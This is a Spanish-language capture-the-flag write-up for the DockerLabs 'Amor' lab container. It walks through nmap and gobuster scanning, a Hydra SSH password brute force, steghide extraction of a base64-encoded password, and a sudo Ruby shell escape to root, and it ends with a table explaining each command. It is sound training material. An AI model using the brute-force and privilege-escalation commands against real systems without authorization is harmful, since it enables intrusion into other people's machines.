# 🗃️ Carpeta Mayor Sergio Baudin Cruz

## 1. CTF Amor 🧑‍💻
Para el taller desarrollado se utilizo el contenedor **AMOR** de DockerLabs, el cual fue desarrollado por Romabri en el año 2024.

![Amor_Docker_Labs](images/amor_docker.jpg)

A continuacion se explicara el procedimiento del CTF, con la finalidad de recopilar y explicar las diferentes herramientas utilizadas en el desarrollo del mismo.

### 🕵️‍♂️ Inicio del CTF
Lo primero es ejecutar el contenedor **AMOR** para poder tener acceso mediante una conexion de red virtual, atraves de Docker.
```bash
./auto_deploy.sh amor.tar 
```

![conexion_amor](images/conexion_amor.png)

Con la IP que tenemos, se procede a realizar un escaneo de puertos y servicios para lo que utilizamos NMAP
```bash
nmap -p- -sCV --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.3 
```

![nmap_1](images/nmap_1.png)
![nmap_2](images/nmap_2.png)

Con los dos puertos abiertos 80 y 22 se puede realizar una verificaciòn a los servicios, se procede a usar Gobuster con el fin de verificar el servicio HTTP
```bash
gobuster dir -u http://172.17.0.3/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
```

![gobuster](images/gobuster.png)

No se logra obtener nada relevante, el siguiente paso es realizar una verificacion OSINT en la pagina que debe desplegar el servicio HTTP, se procede a navegar en la URL de la IP `http://172.17.0.3/`:

![servicio_web](images/servicio_web.png)
![osint_servicio_web](images/osint_servicio_web.png)

Pese a que la informacion de la pagina es muy plana y al parecer netamente informativa, se obtienen 2 nombres, que probablemente esten asociados con informacion de la maquina, por lo tanto se procede a realizar un ataque de fuerza bruta, al servicio SSH activo en el puerto 22.
```bash
hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.3 -t 10 
```

![hydra](images/hydra.png)

Con lo anterior se logra obtener credenciales, al parecer vigentes, en la maquina objetivo, solo resta verificar conexion mediante SSH.
```bash
ssh carlota@172.17.0.3 
```

![conexion_ssh](images/conexion_ssh.png)

Con acceso por medio de **SSH**, se logra realizar una busqueda de que archivos pueden ser relevantes para el desarrollo del CTF, por lo que se realiza un barrido de las carpetas del usuario **carlota**, como se observa en la imagen anterior, encontrando de interes un archivo que aparentemente es una imagen:

![imagen_amor](images/imagen.jpg)

Se debe verificar la imagen con detenimiento, para esto se tiene que extraer de la maquina y pasarla de forma local a nuestro equipo, por eso desde la maquina atacante se usa **SCP**:
```bash
 scp carlota@172.17.0.3:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg /home/XXuserXX/Documents/amor
```

![scp](images/ssp.png)

Ya con la imagen en local se verifica que realmente es un archivo de imagen y se sospecha que puede tener informacion oculta, por lo que se utiliza **Steghide**, con la finalidad de verificar si se uso alguna tecnica de esteganografia, para ocultar un mensaje:
```bash
 steghide --extract -sf imagen.jpg
```

![steghide](images/steghide.png)

Efectivamente se trataba de un mensaje cifrado mediante esteganografia, se logro obtener el archvo **secret.txt** el cual contiene la siguente cadena de caracteres: 
```text
 ZXNsYWNhc2FkZXBpbnlwb24=
```

Se verifica con **Base 64** y se encuentra lo siguiente:
```bash
 echo "ZXNsYWNhc2FkZXBpbnlwb24=" &#124; base64 -d; echo
```

![base64](images/base64.png)

Se logra obtener la contraseña al parecer de otro usuario legitimo en el sistema, para este caso realizamos el intento con **oscar**:

![su_oscar](images/su_oscar.png)


De igual forma que nuestro primer usuario, se realiza una busqueda en las diferentes carpetas del usuario, se verifican permisos vigentes, encontrando algo interesante, **oscar** tiene permisos para ejecutar **/usr/bin/ruby**, sin necesidad de contraseña, lo cual podria llegar a escalar los privilegios del usuario actual, se ejecuta el comando y se verifica:

![root](images/whoami_root.png)

De esta forma se cumpliria con el escalamiento de privilegios, teniendo acceso a la maquina desde el usuario de root, pudiendo realizar cualquier tipo de accion en la maquina.

### 📑 Detalle de comandos y herramientas usadas en el CTF
| Herramienta  | Sintaxis usada                                                                                       | Explicación de cada parámetro                                                                                                                                                                                                                                                                                                                                                                             | ¿Cuándo/por qué usarla?                                                                                                                                                                               | Fuente                                                                                                                                                   |
| ------------ | ---------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Nmap**     | `nmap -p- -sCV --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.3`                                    | `-p-` : escanea todos los puertos TCP 1-65535.<br>`-sC` : ejecuta los scripts NSE por defecto.<br>`-sV` : detección de versión de servicios.<br>`--open` : muestra solo puertos abiertos.<br>`-sS` : SYN scan (semi-abierto).<br>`--min-rate 5000` : envía ≥5 000 paquetes/s.<br>`-vvv` : verbosidad muy alta.<br>`-n` : sin resolución DNS.<br>`-Pn` : omite ping discovery.<br>`172.17.0.3` : objetivo. | Escaneo rápido, sigiloso y completo de todos los puertos para descubrir servicios, versiones y posibles vulnerabilidades cuando el host puede filtrar ICMP o cuando necesitas velocidad en red local. | ([Nmap](https://nmap.org/book/performance.html)) |
| **Gobuster** | `gobuster dir -u http://172.17.0.3/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` | `dir` : modo de fuerza bruta de directorios/archivos.<br>`-u` : URL objetivo (`http://172.17.0.3/`).<br>`-w` : wordlist con nombres a probar (`directory-list-2.3-medium.txt`).                                                                                                                                                                                                                           | Enumerar rutas ocultas (admin, backups, APIs) en un sitio web para ampliar superficie de ataque antes de pruebas de vulnerabilidad o explotación.                                                     | ([GitHub](https://github.com/OJ/gobuster))                                                                                        |
| **Hydra**    | `hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.3 -t 10`                        | `-l carlota` : usuario fijo a probar.<br>`-P` : wordlist de contraseñas (`rockyou.txt`).<br>`ssh://172.17.0.3` : servicio/protocolo y host objetivo.<br>`-t 10` : 10 hilos concurrentes.                                                                                                                                                                                                                  | Auditoría de contraseñas por fuerza bruta en SSH para evaluar la robustez de credenciales o la eficacia de políticas de bloqueo (solo con autorización).                                              | ([Kali Linux](https://www.kali.org/tools/hydra/))                                                                                 |
| **scp**      | `scp carlota@172.17.0.3:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg /home/join/`               | `carlota@172.17.0.3:` : usuario y host remotos.<br>`/home/carlota/Desktop/.../imagen.jpg` : ruta del archivo remoto.<br>`/home/join/` : carpeta destino local.<br>Usa SSH para cifrado y autenticación.                                                                                                                                                                                                   | Transferir de forma segura (cifrada) archivos puntuales entre equipos Linux/Unix; ideal para copias rápidas sin montar sistemas de archivos remotos.                                                  | ([man.openbsd.org](https://man.openbsd.org/scp.1))                                                                                |
| **SSH**                    | `ssh carlota@172.17.0.3`                                 | `ssh` : cliente Secure Shell.<br>`carlota@` : nombre de la cuenta remota.<br>`172.17.0.3` : IP del host destino.                                                                                   | Conectarse de forma cifrada a un servidor para administrar el sistema o encadenar túneles/port-forwarding.                                        | ([Linuxize](https://linuxize.com/post/ssh-command-in-linux/))                                                                                            |                        |
| **file**                   | `file imagen.jpg`                                        | `file` : determina el tipo real de un archivo mediante firmas y “magic numbers”.<br>`imagen.jpg` : objeto a analizar.                                                                              | Verificar si un archivo es realmente la extensión que dice ser, detectar binarios, scripts, imágenes, etc.                                        | ([Linux Documentation](https://linux.die.net/man/1/file))                                                                                 |                        |
| **Steghide**               | `steghide --extract -sf imagen.jpg`                      | `--extract` : modo extracción de datos ocultos.<br>`-sf` `imagen.jpg` : especifica el **ste­go­file** (imagen portadora).                                                                          | Recuperar mensajes, claves o ficheros embebidos en imágenes/audio mediante esteganografía.                                                        | ([OSINT Team](https://osintteam.blog/using-steghide-for-hiding-and-extracting-data-213a5bd03123))                                                                                          |                        |
| **base64**                 | `echo "ZXNsYWNhc2FkZXBpbnlwb24=" &#124; base64 -d; echo` | `echo "…"` : imprime la cadena codificada.<br>\`` : pasa el resultado al siguiente comando.<br>`base64 -d` : decodifica Base64 a texto binario/ASCII.<br>`; echo\` : añade salto de línea limpio. | Decodificar cadenas Base64 rápidamente en terminal (por ejemplo, credenciales, payloads o texto ofuscado). | ([Morgan Cugerone](https://morgan.cugerone.com/blog/quick-tip-encode-and-decode-base64-string-from-command-line/)) |
| **su**                     | `su oscar`                                               | `su` : *substitute/switch user*.<br>`oscar` : usuario al que se cambiará la sesión (si se omite, será *root*).                                                                                     | Adoptar la identidad de otro usuario para probar permisos, realizar tareas administrativas o depurar scripts.                                     | ([Global IT Services](https://phoenixnap.com/kb/su-command-linux-examples))                                                                    |                        |
| **sudo -l**                | `sudo -l`                                                | `sudo` : ejecuta comandos con privilegios elevados.<br>`-l` (*list*) : muestra los comandos permitidos/prohibidos para el usuario en el host actual.                                               | Enumeración de privilegios (Linux privesc): descubrir a qué binarios o rutas se puede acceder con sudo.                                           | ([GeeksforGeeks](https://www.geeksforgeeks.org/sudo-command-in-linux-with-examples/))                                                                                       |                        |
| **sudo + Ruby** | `sudo /usr/bin/ruby -e 'exec "/bin/bash"'`               | `sudo` : eleva a root.<br>`/usr/bin/ruby` : intérprete Ruby autorizado por sudoers.<br>`-e` : evalúa código inline.<br>`exec "/bin/bash"` : reemplaza el proceso Ruby por un shell Bash con UID 0. | Privilege-escalation típico cuando *ruby* está permitido en sudoers; genera una shell raíz inmediata.                                             | ([Medium](https://medium.com/%40ibm_ptc_security/linux-based-privilege-escalation-techniques-1e9b83269a75))                                                                                              |                        |
| **/usr/bin/ruby**          | *(ruta binaria)*                                         | Intérprete oficial de Ruby instalado por el sistema (`apt`, `yum`, etc.); ejecuta scripts `.rb`, gemas y, si se usa con sudo, puede invocar otros binarios con privilegios.                        | Desarrollo en Ruby, automatización de tareas o, en auditorías, comprobar si está en sudoers para procedimiento de escalar privilegios.                              | ([ThoughtCo](https://www.thoughtco.com/instal-ruby-on-linux-2908370))                                                                                           |                        |
| **whoami**                 | `whoami`                                                 | Sin opciones: imprime el nombre de usuario **efectivo** en la sesión actual.                                                                                                                       | Confirmar rápidamente la identidad del usuario desde donde se tiene acceso a una sesion o equipo, validar cuando se escalan privilegios.                                             | ([Global IT Services](https://phoenixnap.com/kb/whoami-linux))                                                                   |                        |
